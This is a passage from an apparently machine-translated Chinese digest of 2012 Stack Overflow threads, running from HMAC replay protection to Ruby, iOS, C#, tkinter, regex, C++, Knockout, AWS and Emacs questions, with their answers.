如果必须发送时间戳，这意味着它必须在客户端和服务器的哈希中，因此必须使用相同的确切时间。现在，这意味着我必须以纯文本或加密的形式发送日期，可能作为标头值。它是否正确？因为如果它很简单，那么重放攻击者就不能轻松地将日期修改到可接受的范围内（出于验证目的）......所以我们可以加密日期，但这意味着哈希和加密数据都在起作用，而不是只是将所有数据加密在一起。

我的评估是否正确，或者有没有办法包括一个安全的日期？还是在这种情况下必须对其进行加密？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T14:59:34.137

HMAC 是消息验证码。这意味着如果您有一些消息 M，您可以使用该消息和您的密钥 K 生成 V = HMAC(M, K)。请记住，只要您将 K 保密，其他人就无法生成相同的 V除非通过尝试猜测 K。如果 K 足够大，这是不可行的。

这也意味着您在 M 中包含的所有内容都不能在不更改 V 的情况下更改，因为 M 和 K 都在 HMAC 中使用。因此，如果包含时间戳，则必须确保它包含在 HMAC 计算中。如果攻击者尝试修改时间戳，HMAC 生成的 V 将不同 -> 您可以检测到该尝试并丢弃该请求。

HMAC 为您提供“真实性”，这意味着您可以判断它是否来自知道密钥的人。加密是不同的：它为您提供“机密性”，这意味着没有人可以在不知道密钥的情况下阅读消息。重要的是要记住，加密不会给你真实性，因为攻击者可能只是改变加密消息中的一个随机位。要同时具​​有机密性和真实性，您必须使用 HMAC 以及加密。

如果您不需要保密，请不要加密您的数据，因为它会浪费 CPU 周期并使您的系统更加复杂而没有任何收获。

# ruby - 如何将此 ruby 代码转换为参数？

> ID：10989805
> 
> 赞同：-3
> 
> 时间：2012-06-12T02:15:53.623
> 
> 标签：ruby

目前它使用以下代码输出反向字符串：

```
string = 'Hello World!'
my_reverse = String.new
i = 1; while i <= string.length
  my_reverse << string[-i]
  i+=1
end

puts my_reverse 
```

但是我想写一个方法，`my_reverse`，它将一个字符串作为参数并返回反转的字符串。像这样：

```
my_reverse("hello")
#=> "olleh" 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:18:49.147

只需将您已有的代码包装在一个方法中：

```
def my_reverse(string_to_reverse)

   reverse_string = String.new
   i = 1; while i <= string_to_reverse.length
     reverse_string << string_to_reverse[-i]
     i+=1
   end

   return reverse_string 

end 
```

然后这样称呼它：

```
>> my_reverse("Hello World") 
```

您应该注意已经存在一种方法来执行此操作：[string.reverse](http://ruby-doc.org/core-1.9.3/String.html#method-i-reverse)。即使那样，这种反向的特殊实现也不是最好的。

# objective-c - 从 UIImagePickerControllerReferenceURL 加载 UIImage

> ID：10989806
> 
> 赞同：6
> 
> 时间：2012-06-12T02:16:14.060
> 
> 标签：objective-c, ios, uiimage, uiimagepickercontroller

我正在使用 UIImagePickerController 来允许用户从图像库中选择图像。然后我想在 sqlite 数据库中启动该文件的位置，以便以后可以参考它。

我一直在做一些关于如何做到这一点的谷歌搜索，而且我的内容很短。我知道我可以通过在委托方法中调用来获取项目的 ReferenceURL：

```
 NSURL *picURL = [info objectForKey:@"UIImagePickerControllerReferenceURL"] 
```

这确实给了我一个有效的 NSURL 对象，如果我输出 picURL.absoluteString，我可以看到文件资产库位置的有效 url。但是，如果我尝试使用此 url 创建一个 NSData 对象，以便我可以反过来创建一个 UIImage，代码将失败，因为 NSData 返回 nil。例如：

```
 NSURL *picURL = [info objectForKey:@"UIImagePickerControllerReferenceURL"]
    NSString *stringUrl = picURL.absoluteString;
    NSData *data = [NSData dataWithContentsOfURL:[NSURL URLWithString:stringUrl]];
    imgMain.image = [UIImage imageWithData:data] 
```

我意识到我在这里有些重复，但重点是获取我可以存储在 sqlite 中的 URL 的字符串表示形式，然后稍后使用所述字符串创建图像（因此上面的代码代表了这种思路）。

我发现了一些关于使用 ALAssetsLibrary 的信息，但这给了我各种各样的配合，因为它似乎不适用于 iOS 5 和 ARC。我不断收到错误消息“例如，接收器类型 ALAsset 消息是前向声明。我可以在引用 ALAsset / ALAssetsLibrary 的文件上设置属性以忽略 ARC，这会停止构建错误，但是一旦我离开代码块，数据就会消失。见下文：

```
 NSURL *referenceURL = [info objectForKey:UIImagePickerControllerReferenceURL];
    ALAssetsLibrary *library = [[ALAssetsLibrary alloc] init];
    __block UIImage *returnValue = nil;
    [library assetForURL:referenceURL resultBlock:^(ALAsset *asset) {
        returnValue = [UIImage imageWithCGImage:[[asset defaultRepresentation] fullResolutionImage]];
    } failureBlock:^(NSError *error) {
       // error handling
    }];
    [library release]; 
```

returnValue 确实返回了一个有效的图像，但只要代码退出 resultBlock，数据的内容就消失了（即 returnValue 再次变为 null）。

所以我的问题是：如何使用 UIImagePickerControllerReferenceURL 并将其转换为我可以存储在 sqlite 中的字符串，然后使用所述字符串在以后创建有效的 UIImage 对象？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-07T19:20:08.107

看起来你在正确的轨道上，保存资产网址。

```
Save
NSURL *picURL = [info objectForKey:@"UIImagePickerControllerReferenceURL"]
NSString *stringUrl = picURL.absoluteString;

Reload AssetURL
NSURL asssetURL = [NSURL URLWithString:stringUrl] 
```

至于稍后加载资产，我将基于您不使用 arc 的假设。这可以解释为什么你的 returnValue 为零。

您是否尝试在结果中添加保留？例如：

```
 NSURL *referenceURL = [NSURL URLWithString:savedAssetURLString]
    ALAssetsLibrary *library = [[ALAssetsLibrary alloc] init];
    __block UIImage *returnValue = nil;
    [library assetForURL:referenceURL resultBlock:^(ALAsset *asset) {
        returnValue = [[UIImage imageWithCGImage:[[asset defaultRepresentation] fullResolutionImage]] retain]; //Retain Added
    } failureBlock:^(NSError *error) {
       // error handling
    }];
    [library release]; 
```

# c# - C# - 如何将 Hashtable 添加到 Listview？

> ID：10989811
> 
> 赞同：-2
> 
> 时间：2012-06-12T02:16:56.313
> 
> 标签：c#

C# - 如何将 Hashtable 添加到 Listview？我有一个返回 Hashtable 的函数，我希望能够将 Hashtable 的内容添加到 Listview。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:26:49.757

由于缺乏信息，非常通用，但大致如下：

```
foreach (var item in hashtable.Values)
{
    listView.Items.Add(new ListViewItem(item.ToString()));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T02:33:11.657

您可以按照您想要的方式提供`ListView's` `DisplayMember`as `Key`of`Hashtable`和`ValueMember`as Value of`HashTable`或反之亦然。

# python - 在python中隐藏密码输入输入

> ID：10989819
> 
> 赞同：1
> 
> 时间：2012-06-12T02:18:13.317
> 
> 标签：python, passwords, tkinter

我正在尝试制作一个小登录程序。但我不确定当你输入密码时是否有办法用星号替换“密码”。这是我的代码：

```
from tkinter import *

def callback():
print("hi")

top = Tk()
L1 = Label(top, text="User Name")
L1.grid(row=0, column=0)
E1 = Entry(top, bd = 5)
E1.grid(row=0, column=1)

L1 = Label(top, text="Password")
L1.grid(row=1, column=0)
E1 = Entry(top, bd = 5)
E1.grid(row=1, column=1)

MyButton1 = Button(top, text="Submit", width=10, command=callback)
MyButton1.grid(row=3, column=1)

top.mainloop() 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-12T02:23:09.333

使用该`show="*"`选项。例如

```
E1 = Entry(top, bd = 5, show="*") 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:21:23.500

```
from getpass import getpass
getpass() 
```

在网络上浮动有多种替代方案，这些替代方案已被更改为呼应某些东西，例如星号。不幸的是，它们往往是特定于平台的，不像 getpass()。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-01-27T17:15:35.357

您可以通过这种方式创建一个条目并像密码一样隐藏它

```
from tkinter import *

def show():
    entry.configure(show='')
    check.configure(command=hide, text='hide password')

def hide():
    entry.configure(show='*')
    check.configure(command=show, text='show password')

window = Tk()
window.title('The Title')
window.geometry('400x400')
window.resizable(False, False)

entry = Entry(window, show='*')
entry.pack()

check = Checkbutton(window, text='show password',
        command=show)
check.pack()

window.mainloop() 
```

# javascript - 如何匹配 Javascript 中的符号？

> ID：10989826
> 
> 赞同：0
> 
> 时间：2012-06-12T02:19:58.750
> 
> 标签：javascript, regex

我正在处理密码验证屏幕，要求至少有一个符号，例如下面列出的符号。

我应该如何转义它们以便它在 Javascript 下正常工作？

```
//validate symbol
if (pswd.match(/`~!@#$%^&*()_+=-\][{}\;':"<>?,/./)) {
    $('#symbol').removeClass('invalid').addClass('valid');
} else {
    $('#symbol').removeClass('valid').addClass('invalid');
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T02:23:15.963

改用这个：

```
if (pswd.match(/[^A-Za-z0-9]+/)) { 
```

它匹配包含至少一个不在列表中的字符的任何文本`[A-Za-z0-9]`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:29:35.247

斜线和右方括号是唯一需要在字符组中转义的 - 只要连字符不在两个字符之间。

```
if(/[/`~!@#$%^&*()_+=[{};':"<>?,.\/\]-]/.test(pswd) ){ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T02:29:21.863

我不确定您要匹配的字符，因为原始字符串非常混乱。检查这是否是您想要的所有字符：

```
"we?dn^~!@#$%^&*()_+-={dsfs}sf[]\\|:\";',./?><".match(/[`~!@#$%^&*()_+=\]\[{};':"<>?,\/.-]/g)
>> ["?", "^", "~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "-", "=", "{", "}", "[", "]", ":", """, ";", "'", ",", ".", "/", "?", ">", "<"] 
```

为了清楚起见，这是正则表达式：

```
/[`~!@#$%^&*()_+=\]\[{};':"<>?,\/.-]/ 
```

**编辑**

如果您想包含`\`并`|`使用此正则表达式：

```
/[\\`~!@#$%^&*()_+=\]\[{};':"<>?,\/.|-]/ 
```

# c++ - Base2 类中对 `vtable 的未定义引用

> ID：10989828
> 
> 赞同：1
> 
> 时间：2012-06-12T02:20:37.147
> 
> 标签：c++, vtable, undefined-reference

我有以下代码：

```
// IBase.h
#include <iostream>

class IBase{
    public:
           virtual string getId();
};

// IBase.cpp
#include "IBase.h"
string IBase::getId(){};

// Base.h
#include <iostream>
#include <string>
#include "IBase.h"

using namespace std; 
class Base : public IBase{
    protected:
           string id;
    public:
           Base(string _id);
           string getId();
};

// Base.cpp
#include "Base.h"

Base::Base(string _id){
    id = _id;  
}
string Base::getId(){
    return id;
}

// Base2.h
#include <iostream>
#include <string>
#include "Base.h" 
using namespace std;

class Base2 : public Base{
    public:
          Base2(string _id);
          string getId(); 
}; 

// Base2.cpp
#include "Base2.h"
Base2::Base2(string _id) : Base(_id){}; 
```

当我编译项目时，我得到了未定义的对 Base2 中的 vtable 的引用！这是我想念什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:24:40.987

对 vtable 的未定义引用通常表明第一个虚函数（通常存储 vtable 的地方）没有链接。

由于没有`Base2::getId`提供定义（第一个虚函数），因此没有链接任何 vtable。

在类定义中为函数添加定义`Base2::getId`或删除声明。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:29:53.403

函数声明需要定义。否则，声明将简单地抑制函数定义（可能是从基类继承的）。您有以下选择：

*   删除`string getId();`from`Base2`类声明，或
*   自己定义函数，或者
*   通过 using 声明从合适的基类导入特定定义，例如`using Base::getId;`

另请注意以下几点：

```
 string IBase::getId(){}; 
```

*   需要定义一个 return 语句（并返回一个可转换为的对象`string`）
*   定义后不需要分号

# jquery - 不能减慢smoothdivscroll down...尤其是在IE 9中

> ID：10989838
> 
> 赞同：0
> 
> 时间：2012-06-12T02:22:42.003
> 
> 标签：jquery, plugins

我正在使用 Thomas Kahn 的 smoothdivscroll 插件。我有标签与图像的组合

标签。Firefox 中的滚动速度在某种程度上是可控的，但在 IE 9 中我无论如何都找不到减慢它的速度。这也有点零星。关于如何使其在 IE 9 中更流畅和更慢的任何想法？请在下面找到我的代码...谢谢...

```
<?php 
session_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<link rel="stylesheet" href="/css/TEST.css" type="text/css">
<link rel="stylesheet" href="/css/videoCarousel.css" type="text/css">
<link rel="stylesheet" href="/css/tabs.css" type="text/css">
<link rel="Stylesheet" href="/css/smoothDivScroll.css" type="text/css">

<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1" >
<meta name="keywords" content="financial, advisor, money manager">
<!--<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>-->
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>

<script src="/js/jquery-ui-1.8.18.custom.min.js" type="text/javascript"></script>
<script src="/js/jquery.smoothdivscroll-1.2-min.js" type="text/javascript"></script>
<script src="/js/jquery.mousewheel.min.js" type="text/javascript"></script>
<script type="text/javascript" src="/js/jcarouselliteNEW.js"></script>
<script type="text/javascript">
$(document).ready(function() {

//js for tabs
var tabContents = $(".tab_content").hide(), 
tabs = $("ul.tabs li");

tabs.first().addClass("active").show();
tabContents.first().show();

tabs.click(function() {
    var $this = $(this), 
        activeTab = $this.find('a').attr('href');

    if(!$this.hasClass('active')){
        $this.addClass('active').siblings().removeClass('active');
        tabContents.hide().filter(activeTab).fadeIn();
    }

    return false;
});//end tabs function

}); //end dom
</script>
</head> 
<body> 
<div id="container">
<div id="tickerTape">
    <a href="http://audio.wrko.com/wrko/financial-exchange.htm" target="_blank"><img src="/images/financialExchange.png" width="300px" height="21px" alt="Listen to Barry live" id="fiEx" /></a>
    <a href="http://audio.wrko.com/wrko/financial-exchange.htm" target="_blank"><p>with Barry Armstrong...Click here to LISTEN LIVE 9-11am...</p></a>
    <a href="http://audio.wrko.com/wrko/financial-exchange.htm" target="_blank"><img src="/images/wrkoLogoNoTxt.png" width="65px" height="24px" alt="Listen to Barry live" /></a>
    <a href="http://audio.wrko.com/wrko/financial-exchange.htm" target="_blank"><img src="/images/financialExchange.png" width="300px" height="21px" alt="Listen to Barry live" id="fiEx" /></a>
    <a href="http://audio.wrko.com/wrko/financial-exchange.htm" target="_blank"><p>with Barry Armstrong...Click here to LISTEN LIVE 9-11am...</p></a>
    <a href="http://audio.wrko.com/wrko/financial-exchange.htm" target="_blank"><img src="/images/wrkoLogoNoTxt.png" width="65px" height="24px" alt="Listen to Barry live" /></a>

</div><!--end tickerTape-->
</div><!--end container-->
<script type="text/javascript">

$("#tickerTape").smoothDivScroll({ 
autoScrollingMode: "always",
hotSpotScrolling:false,
mousewheelScrolling:false,
autoScrollDirection: "endlessloopright",
autoScrollInterval:5, 
autoScrollStep:7 
}); //end tickerTape

// tickerTape event handlers
$("#tickerTape").bind("mouseover", function() {
$(this).smoothDivScroll("stopAutoScrolling");
}).bind("mouseout", function() {
$(this).smoothDivScroll("startAutoScrolling");
});

</script>

</body> 
</html> 
```

# knockout.js - 在嵌套的“foreach”中访问外部循环属性

> ID：10989839
> 
> 赞同：24
> 
> 时间：2012-06-12T02:23:01.197
> 
> 标签：knockout.js

我在 Knockout.js 中有一个嵌套的 foreach 循环，我想从内部循环内部的外部循环中的当前对象访问一个属性。

```
<!-- ko foreach: graduationDateRows -->                  
  <tr>
    <td class="center" data-bind="text: CalendarYear"></td>  
    <!-- ko foreach: $root.graduationDatesHeaders -->
    <td class="center" data-bind="text: /* !here! */"></td> 
    <td></td>
    <!-- /ko -->                                                                  
  </tr> 
<!-- /ko --> 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-12T03:50:26.287

您可以使用`$parent`向上访问一个范围级别。因此，从您的内部循环中，您可以使用`parent`访问当前正在循环的项目`graduationDateRows`

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-09-27T17:55:25.817

您甚至可以在绑定中使用和别名遍历**完全不相关的数组。**`$parent``as``foreach`

考虑[以下示例](http://jsfiddle.net/whQmX/)：

```
var VM = function(){
    this.rows = ['one','two','three'];
    this.cols = [1,2,3,4,5];
}
ko.applyBindings(new VM()); 
```

```
<table border="1">
    <tr>
        <th></th>
        <!-- ko foreach: cols -->
        <th data-bind="text: $data"></th>
        <!-- /ko -->
    </tr>
    <!-- ko foreach: {data: rows, as: 'row'} -->
    <tr>
        <th data-bind="text:row"></th>
        <!-- ko foreach: {data: $parent.cols, as: 'col'} -->
        <td data-bind="text:row + '/' + col"></td>
        <!-- /ko -->
    </tr>
    <!-- /ko -->  
</table> 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-07-11T11:52:13.453

要从内部循环中的当前对象访问外部循环中的属性，您可以使用`$parent.property_name`.

例如：

```
<ul id="salesInfo" data-bind="foreach : salesInfo ">
    <li class="department">
        <a href="#" data-bind="text: name" />
        <ul id="salesDept" data-bind="foreach: years">
            <li class="years">
                <a href="#" data-bind="text: year, click:function(data, event) { $root.yearClicked(year,$parent.name,data) }" />
            </li>
        </ul>
    </li>
</ul> 
```

`salesInfo`数组的样本对象：

```
{
    "id" : "0",
    "name" : "Human Resources",
    "years" : [
        { "year" : "2012", "values" : [250000,350000,150000,220000,450000,180000] }
    ]
} 
```

# linux - 在 Amazon EC2 上使用机架空间云映像？

> ID：10989848
> 
> 赞同：0
> 
> 时间：2012-06-12T02:24:56.963
> 
> 标签：linux, amazon-ec2, rackspace-cloud

我有一个运行 Ubuntu 11.10 的 Rackspace（英国）云实例，它需要 10 多个工时来安装我需要的所有软件包（和自定义应用程序代码）、加强安全性、测试等。

我可以拍一张快照，然后在 Rackspace UK 上启动另一个实例。那效果很好。因为我有 /etc 在 git 源代码控制下，我可以看到启动过程更改的文件是：

*   网络文件（IP 地址，默认网关）
*   根密码
*   /etc/主机名

关于我需要做的唯一启动后步骤是 DNS 条目和`dpkg-reconfigure postfix`设置新机器名称。

我假设，但尚未测试，我可以将这个图像与 Rackspace US 一起使用，但是对于 Amazon EC2（或任何其他云提供商）呢？我可以只下载图像，将其上传到 Amazon S3，然后使用它启动新实例吗？如果没有，我可以运行一个实用程序来将一种 linux 图像格式转换为另一种吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T01:07:04.863

穷人的做法是在服务器之间使用rsync。Rackspace 对此有 3 部分指南，从这里开始： [http ://www.rackspace.com/knowledge_center/index.php/Migrating_a_Linux_Server_From_Command_Line_Stage_1](http://www.rackspace.com/knowledge_center/index.php/Migrating_a_Linux_Server_From_Command_Line_Stage_1)

# hlsl - DirectCompute写入缓冲区速度

> ID：10989853
> 
> 赞同：2
> 
> 时间：2012-06-12T02:26:16.673
> 
> 标签：hlsl, directx-10, directcompute

我正在研究粒子 sim 并且遇到了一些瓶颈，使用 UAV 写入 RWStructured 单浮点缓冲区的速度太慢了大约 10 倍。从实验来看，带宽似乎并不短缺，但访问时间本身就让它陷入困境。追加写入是不可能的，因为传出数据需要按特定顺序排列。这是在 DX10/SM4 硬件上，所以这里有几个问题：有没有办法加快速度（除了写入更大的数据块，因为着色器的输出是不连续的）？如果不是，那么 DX11 级硬件与无人机相比是否更快？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T16:05:50.093

首先（如果您还没有这样做的话），要分析您的着色器代码，就是将 GPU 查询添加到您的系统。这是一个解释它的链接：

[http://mynameismjp.wordpress.com/2011/10/13/profiling-in-dx11-with-queries/](http://mynameismjp.wordpress.com/2011/10/13/profiling-in-dx11-with-queries/)

它在 dx11 中，但功能也在 dx10 中，因此移植应该非常简单。

在计算之后有不同的方面，但第一个是玩：

```
[numthreads(TGX, 1, 1)] 
```

尝试像 8,16,32,64 这样的值并尝试找到最佳位置（不要忘记在您的调度上进行划分）。

# .net - 使用 al.exe 对程序集进行签名：

> ID：10989862
> 
> 赞同：1
> 
> 时间：2012-06-12T02:28:08.350
> 
> 标签：.net, interop

此命令失败：

```
al.exe /out:ClassLibrary3.dll Class3.netmodule /keyfile:sgKey.snk 
```

我不知道为什么。以下是它在命令行上失败的方式：

```
C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bin\NETFX 4.0 Tools>al.exe /
out:ClassLibrary3.dll Class3.netmodule /keyfile:sgKey.snk
Microsoft (R) Assembly Linker version 10.0.30319.1
Copyright (C) Microsoft Corporation. All rights reserved.

ALINK: error AL1047: Error importing file 'c:\Program Files (x86)\Microsoft
        SDKs\Windows\v7.0A\Bin\NETFX 4.0 Tools\Class3.netmodule' -- The system
        cannot find the file specified.

C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bin\NETFX 4.0 Tools> 
```

Class3 是我的程序集中唯一的类。这是在目录中寻找一些物理的“Class3.netmodule”文件或对象吗？

感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T02:41:41.377

具体来说，此命令正在尝试从网络模块生成程序集。所以是的，它正在寻找一个名为“Class3.netmodule”的物理文件。

您不能从命令行任意签署程序集。您必须在编译期间对其进行签名；或者，如果设置为延迟签名，请使用`sn.exe -R[a]`.

# android - 将主页按钮添加到 ActionBarSherlock

> ID：10989863
> 
> 赞同：0
> 
> 时间：2012-06-12T02:28:17.133
> 
> 标签：android, android-actionbar

我刚刚在我的应用程序中实现了 ActionBarSherlock，但它没有向我显示 HOME 或 BACK 按钮。我只看到应用名称。所以，任何人都可以告诉我如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T08:12:02.243

试试这个代码：

```
getSupportActionBar().setHomeButtonEnabled(true); 
```

# php - 在 CodeIgniter 中设置表单验证规则而不重复代码

> ID：10989865
> 
> 赞同：0
> 
> 时间：2012-06-12T02:28:33.160
> 
> 标签：php, codeigniter

如果输入具有相同的验证规则，如在本例中是必需的，我如何在 codeIgniter 中设置验证规则。

```
 $this->form_validation->set_rules('username', 'Username', 'required');
            $this->form_validation->set_rules('password', 'Password', 'required');
            $this->form_validation->set_rules('firstname', 'Firstname', 'required');
            $this->form_validation->set_rules('middlename', 'Middlename', 'required');
            $this->form_validation->set_rules('lastname', 'Lastname', 'required'); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T02:39:46.237

您可以简单地创建一个字段数组，然后对数组进行迭代

```
$fields = array('username' => 'Username', 'password' => 'Password', 'firstname' => 'Firstname');
foreach($fields AS $key=>$val){
 $this->form_validation->set_rules($key, $val, 'required')
} 
```

下次，您只需将新项目添加到`$fields`数组中，它就会自动为您添加验证规则。

# emacs - 如何更改 GNU Emacs-AUCTeX 中的默认编译命令/快捷方式？

> ID：10989868
> 
> 赞同：2
> 
> 时间：2012-06-12T02:29:01.063
> 
> 标签：emacs, compilation, latex, command, auctex

在启用了 AUCTeX 的 GNU Emacs 中，CC CC 是在活动缓冲区上运行乳胶的默认快捷方式。在乳胶生成 dvi 输出后，如何将其更改为也运行 dvips？我可以定义一个新的快捷方式，比如 CC CD，并将其分配给上述操作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:51:29.730

```
M-x describe-key <RET> C-c C-c
C-h k C-c C-c 
```

每个都会给你调用编译的函数名。然后你可以在你的 .emacs 中重新绑定如下：

```
(global-set-key (kbd "C-c C-d") '<function name>) 
```

这并不完全通用，因为我并不完全熟悉 AUCTeX 的内部结构。通常会运行某种类型的模式挂钩（阻止您重新绑定全局）。

[这是一个改编自http://emacswiki.org/emacs/AUCTeX](http://emacswiki.org/emacs/AUCTeX)的示例

```
 (add-hook 'LaTeX-mode-hook
              '(lambda ()
                 (local-set-key "<key>" '<function name>))) 
```

至于您关于运行 dvips 的问题，您将定义自己的函数并进行键绑定。以与上述类似的方式。

# ruby - 如何在 OS X 10.6.8 中设置 Ruby？

> ID：10989869
> 
> 赞同：0
> 
> 时间：2012-06-12T02:29:01.230
> 
> 标签：ruby, macos, gem, rvm

我决定开始尝试 Ruby 以摆脱我的 Java 小盒子，并想从一个小的个人项目开始，获取一些书面地址并对其进行地理编码。

作为开始，我得到了[Koans](http://rubykoans.com/)并开始从命令行开始使用它们，只使用 OS X 中安装的 Ruby（ruby -version 返回 1.8.7）。到现在为止还挺好。然后我用`gem install geocoder`了，效果很好。但是要使用它的一些对象，它需要 json，等等`gem install json`...

```
WARNING:  Installing to ~/.gem since /Library/Ruby/Gems/1.8 and
      /usr/bin aren't both writable.
WARNING:  You don't have /Users/sharakan/.gem/ruby/1.8/bin in your PATH,
      gem executables will not run.
Building native extensions.  This could take a while...
ERROR:  Error installing json:
    ERROR: Failed to build gem native extension.

/System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/bin/ruby extconf.rb
mkmf.rb can't find header files for ruby at /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/ruby.h

Gem files will remain installed in /Users/sharakan/.gem/ruby/1.8/gems/json-1.7.3 for inspection.
Results logged to /Users/sharakan/.gem/ruby/1.8/gems/json-1.7.3/ext/json/ext/parser/gem_make.out 
```

gem_make.out 文件只是有相同的 mkmf.rb 错误。

经过一番搜索，我发现有类似问题的人通过安装 XCode 找到了解决方案。我很久没有看到我的 XCode DVD 了，Apple 提供的版本现在需要 10.7。

我还发现了一些使[RVM](https://rvm.io/)听起来可以解决问题的信息。但遗憾的是，编译问题也失败了：

```
[2012-06-11 20:50:00]  ./configure --prefix=/Users/sharakan/.rvm/rubies/ruby-1.9.3-p194 --enable-shared --disable-install-doc --with-libyaml --with-opt-dir=/Users/sharakan/.rvm/usr 
configure: WARNING: unrecognized options: --with-libyaml
checking build system type... i386-apple-darwin10.8.0
checking host system type... i386-apple-darwin10.8.0
checking target system type... i386-apple-darwin10.8.0
checking for gcc... gcc
checking whether the C compiler works... no
configure: error: in `/Users/sharakan/.rvm/src/ruby-1.9.3-p194':
configure: error: C compiler cannot create executables
See `config.log' for more details 
```

那么接下来要去哪里呢？我真的需要购买 Lion 才能让 Ruby 在我的机器上运行吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:37:57.717

您可以从 Apple 开发者网站获得 Snow Leopard 版本的 Xcode/Developer Tools。您可能还想研究Kenneth Reitz 的[Xcode、GCC 和 Homebrew](http://kennethreitz.com/xcode-gcc-and-homebrew.html)：没有 Xcode 的独立 GCC 工具。还有一个官方的 Apple 分支，尽管可能只有 Lion。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:38:27.530

如果你的问题是你没有安装 xcode，你真的只需要安装 make、gcc 等。

最简单的方法是使用[OS X GCC Installer](https://github.com/kennethreitz/osx-gcc-installer)

安装它应该会让你上路。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T03:57:58.010

你可以试试 RailsInstaller for OSX，它包括 RVM、Ruby、Rails 和 ruby​​ 所需的最重要的库，你可以在这里下载它[https://github.com/railsinstaller/railsinstaller-nix/downloads](https://github.com/railsinstaller/railsinstaller-nix/downloads)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T20:26:33.110

使用 RVM 安装 ruby​​。我强烈推荐使用 RVM，特别是如果您可能有多个项目可能使用不同版本的 Ruby（甚至是 JRuby！）

[https://rvm.io/rvm/install/](https://rvm.io/rvm/install/)

# amazon-s3 - 从 Amazon S3 提取文件和元数据的有效方法？

> ID：10989880
> 
> 赞同：6
> 
> 时间：2012-06-12T02:30:46.620
> 
> 标签：amazon-s3

是否有更有效的方法来列出 Amazon S3 中存储桶中的文件并提取每个文件的元数据？我正在使用 AWS PHP 开发工具包。

```
if ($paths = $s3->get_object_list('my-bucket')) {
    foreach($paths AS $path) {
        $meta = $s3->get_object_metadata('my-bucket', $path);
        echo $path . ' was modified on ' . $meta['LastModified'] . '<br />';
    }
} 
```

目前我需要运行[get_object_list()](http://docs.amazonwebservices.com/AWSSDKforPHP/latest/index.html#m=s3browserupload/get_object_list)来列出所有文件，然后为每个文件运行 get_object_metadata( [)](http://docs.amazonwebservices.com/AWSSDKforPHP/latest/class/s3browserupload/get_object_metadata.html)以获取其元数据。

如果我的存储桶中有 100 个文件，它会进行 101 次调用来获取这些数据。如果可以在 1 次通话中完成，那就太好了。

例如：

```
if ($paths = $s3->get_object_list('my-bucket')) {
    foreach($paths AS $path) {
        echo $path['FileName'] . ' was modified on ' . $path['LastModified'] . '<br />';
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T14:28:34.197

我知道这有点老了，但我遇到了这个问题，为了解决这个问题，我扩展了 Aws sdk 以使用批处理功能来解决这类问题。它可以更快地检索大量文件的自定义元数据。这是我的代码：

```
 /**
     * Name: Steves_Amazon_S3
     * 
     * Extends the AmazonS3 class in order to create a function to 
     * more efficiently retrieve a list of
     * files and their custom metadata using the CFBatchRequest function.
     * 
     * 
     */
    class Steves_Amazon_S3 extends AmazonS3 {

        public function get_object_metadata_batch($bucket, $filenames, $opt = null) {
            $batch = new CFBatchRequest();

            foreach ($filenames as $filename) {

                $this->batch($batch)->get_object_headers($bucket, $filename); // Get content-type
            }

            $response = $this->batch($batch)->send();

            // Fail if any requests were unsuccessful
            if (!$response->areOK()) {
                return false;
            }
            foreach ($response as $file) {
                $temp = array();
                $temp['name'] = (string) basename($file->header['_info']['url']);
                $temp['etag'] = (string) basename($file->header['etag']);
                $temp['size'] = $this->util->size_readable((integer) basename($file->header['content-length']));
                $temp['size_raw'] = basename($file->header['content-length']);
                $temp['last_modified'] = (string) date("jS M Y H:i:s", strtotime($file->header['last-modified']));
                $temp['last_modified_raw'] = strtotime($file->header['last-modified']);
                @$temp['creator_id'] = (string) $file->header['x-amz-meta-creator'];
                @$temp['client_view'] = (string) $file->header['x-amz-meta-client-view'];
                @$temp['user_view'] = (string) $file->header['x-amz-meta-user-view'];

                $result[] = $temp;
            }

            return $result;
        }
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-21T10:15:29.340

